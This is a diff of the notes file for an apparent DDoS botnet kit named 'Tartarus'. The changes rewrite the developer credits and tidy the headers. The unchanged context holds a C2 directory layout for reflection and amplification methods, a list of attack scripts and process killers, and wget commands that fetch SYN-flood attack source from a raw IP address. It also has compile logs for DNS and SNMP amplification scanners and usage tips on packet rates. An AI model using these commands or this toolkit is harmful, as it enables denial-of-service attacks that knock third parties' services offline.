@@ -44,29 +44,9 @@ the "wget.py" is our installation script. this install the process killers, and 
 ==================================================
 Inside of the /c2/amp/methods/reflections/ Directory we are now making directories for all scannable/Reflection Based Methods: the install script does this on its own
 ==================================================
-Developers:
-IPHM_Attack_Process_Killer - 
-IPHM_Scanner_Process_Killer - 
-IPHM_Attack_Process_Killerv2 - 
-IPHM_Scanner_Process_Killerv2 - 
-install.py - 
-IPHM_Method_Installationv2.py - 
-Reaper Attack Script - 
-Reaper Scanner Script - 
-Tartarus Attack Script - 
-Tartarus Scanner Script - 
-Arc Method - 
-wget.py - 
-scan.py - 
-Tartarus.py - 
-bot.c - 
-Tartarus  (1-8) - 
-Tartarus  (10) - 
-cncv2.py - 
-lockdown.c - 
-(All logs and directory changes) - 
+Developers: Vexvain :)
 ===================================================
-Tartarus
+Tartarus:
 HUN-FUN Attack Script 
 ASS-CRK Attack Script
 EFT-PWR Attack Script
@@ -74,7 +54,7 @@ PMP-PMP Attack Script
 VEX-VAIN Attack Script
 ===================================================
 resolver.h - Unsure
-iplookupapi.php - Created By Snickers
+iplookupapi.php - Unsure
 ==================================================
 ╔═════════════════════════════════════════════════════════╗
 ║ Tartarus  - Compilation logs - Attack Scripts - Scanners ║
@@ -185,7 +165,7 @@ wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/syn_colle
 wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/syn_collection/issyn.c -O issyn.c; chmod 777 issyn.c
 ==================================================
 ╔════════════════════════════════════════════════════════════╗
-║ Tartarus  - Compilation logs - Attack Scripts - Scanners v2 ║
+║ Tartarus  - Compilation logs - Attack Scripts - Scanners v2║
 ╚════════════════════════════════════════════════════════════╝
 # DNS:       - 0 Error Logs - 0 Warning Logs  || Compile Success!  || DNSSCAN:      - 1 Error Logs - 0 Warning Logs  || Compile Failed!
 # SNMP:      - 0 Error Logs - 0 Warning Logs  || Compile Success!  || SNMPSCAN:     - 0 Error Logs - 3 Warning Logs  || Compile Success!
@@ -216,7 +196,7 @@ wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/syn_colle
 
 
 ╔═════════════════════════════════════════════════════════╗
-║ Tartarus  - Script Usages - Attack Scripts - Scanners v2 ║
+║ Tartarus  - Script Usages - Attack Scripts - Scanners v2║
 ╚═════════════════════════════════════════════════════════╝
 ###############
 # Ok, so trim_integer suggest using -1 for all IPHM based methods < pps should = -1
